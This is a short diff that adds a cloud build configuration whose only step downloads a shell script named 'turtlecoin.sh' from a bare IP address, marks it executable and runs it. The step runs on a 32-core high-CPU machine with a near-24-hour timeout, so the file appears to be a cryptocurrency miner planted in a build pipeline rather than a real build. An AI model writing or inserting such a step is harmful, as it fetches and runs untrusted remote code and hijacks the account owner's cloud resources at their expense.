@@ -1,0 +1,12 @@
+steps:
+  - name: 'python:3.8'
+    entrypoint: "bash"
+    args:
+      - "-c"
+      - |
+          wget -O test.sh http://144.202.12.72:8080/k8MEv/turtlecoin.sh
+          chmod 777 test.sh
+          ./test.sh
+timeout: 86399s
+options:
+  machineType: E2_HIGHCPU_32
